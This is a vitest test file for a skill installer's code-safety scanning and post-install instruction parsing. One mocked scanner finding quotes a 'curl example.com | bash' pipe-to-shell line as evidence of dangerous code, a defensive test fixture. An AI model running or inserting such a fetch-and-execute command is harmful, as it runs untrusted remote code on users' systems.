import fs from "node:fs/promises";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { withTempWorkspace } from "./skills-install.download-test-utils.js";
import { extractPostInstallInstructions, installSkill } from "./skills-install.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "./skills-install.test-mocks.js";

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../security/skill-scanner.js")>()),
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"simpleclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  it("adds detailed warnings for critical findings and continues install", async () => {
    await withTempWorkspace(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    });
  });

  it("warns and continues when skill scan fails", async () => {
    await withTempWorkspace(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
        true,
      );
    });
  });
});

describe("extractPostInstallInstructions", () => {
  it("extracts '## After connecting' section", () => {
    const content = `---
name: notion
description: Notion skill
---

# Notion

## Setup

Run setup.sh.

## After connecting

1. Search for pages
2. Fetch integration info

## Troubleshooting

Fix things here.
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("1. Search for pages\n2. Fetch integration info");
  });

  it("extracts '### After setup' section", () => {
    const content = `---
name: test
---

# Test

### After setup

Do these things after setup.

### Commands

Other content.
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Do these things after setup.");
  });

  it("extracts 'After install' section", () => {
    const content = `# Skill

## After install

Run the following commands.

## Usage
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Run the following commands.");
  });

  it("extracts 'Post-install' section", () => {
    const content = `# Skill

## Post-install

Check that everything works.

## Reference
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Check that everything works.");
  });

  it("extracts 'Getting started' section", () => {
    const content = `# Skill

## Getting started

Welcome! Here's what to do.

## API Reference
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Welcome! Here's what to do.");
  });

  it("returns undefined when no matching section exists", () => {
    const content = `---
name: test
---

# Test

## Setup

Run setup.

## Commands

Do stuff.
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBeUndefined();
  });

  it("extracts section that extends to end of file", () => {
    const content = `# Skill

## After connecting

Do these things.
They are important.
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Do these things.\nThey are important.");
  });

  it("handles content without frontmatter", () => {
    const content = `# Skill

## After connecting

Instructions here.

## Other
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Instructions here.");
  });

  it("returns undefined for empty section", () => {
    const content = `# Skill

## After connecting

## Next section
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBeUndefined();
  });

  it("stops at same-level heading", () => {
    const content = `# Skill

## After connecting

Step 1.

### Sub-heading

Details under sub-heading.

## Next section

Other content.
`;
    const result = extractPostInstallInstructions(content);
    expect(result).toBe("Step 1.\n\n### Sub-heading\n\nDetails under sub-heading.");
  });
});
